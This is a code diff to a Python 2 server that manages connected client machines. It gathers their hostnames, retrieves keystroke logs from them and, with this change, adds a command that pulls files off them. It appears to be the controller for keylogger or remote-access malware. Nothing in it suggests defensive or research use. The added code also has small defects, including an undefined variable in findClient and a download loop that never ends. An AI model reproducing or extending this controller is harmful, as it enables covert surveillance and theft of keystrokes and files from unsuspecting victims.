@@ -11,7 +11,8 @@ def newConn(c, addr):
 			c.getpeername()
 		except:
 			ip = findClientBySocket(c)
-			sys.stdout.write(str(ip) + " has disconnected...\n>")
+			hostname = findClient(c)[3]
+			sys.stdout.write(str(ip) +"/"+ hostname + " has disconnected...\n>")
 			sys.stdout.flush()
 			return;
 
@@ -31,9 +32,15 @@ def findClientBySocket(socket):
 		
 	print("Socket could not be matched to client")
 
+def findClient(socket):
+	for i in xrange(len(clientList)):
+		if(socket == clientList[i][0]):
+			return clientList[i]
+		else:
+			print(str(iD) + " not found...")
+
 def findSocketById(iD):
 	for i in xrange(len(clientList)):
-		print("{0}, {1}".format(clientList[i][2], int(iD)))
 		if(int(iD) == clientList[i][2]):
 			return clientList[i][0]
 		else:
@@ -47,14 +54,19 @@ s.listen(5)
 clientList = []
 Id = 0
 
+def trimMessage(m):
+	newM = m.split('\x00')[0]
+	return newM
+
 def waitForConns():
 	print("Waiting for connections...\n")
 	while(True):
 		c, addr = s.accept()
+		hostname = trimMessage(c.recv(256))
 		global Id
 		Id = Id + 1
 		iD = Id
-		clientList.append([c, addr, iD])
+		clientList.append([c, addr, iD, hostname])
 		t = threading.Thread(target=newConn, args=[c,addr])
 		t.setDaemon(True)
 		t.start()
@@ -77,19 +89,33 @@ def recvKeyLogs(socket):
 		
 	
 
-def whatDo(iD, cmd):
-	socket = findSocketById(iD)
-	if(cmd == "log"):
+def whatDo(cmd):
+	socket = findSocketById(cmd[0])
+	if("log" in cmd):
 		keyLog(socket)
-	elif(cmd == "list"):
-		printClients()	
+	elif("list" in cmd):
+		printClients()
+	elif("download" in cmd):
+		downloadFile(socket)	
 
 def getUserCmd():
 	while(True):
 		if(len(clientList) > 0):
 			cmd = raw_input(">")
+			if(cmd == ""):
+				print("enter command")
+				continue
 			cmd = cmd.lower().split()
-			whatDo(cmd[0], cmd[1])
+			whatDo(cmd)
+
+def downloadFile(socket):
+	socket.send("send")
+	f = open("test.jpg", "w")
+	while(True):
+		line = socket.recv(1024)
+		print(line)
+		f.write(line)
+		
 
 
 def main():
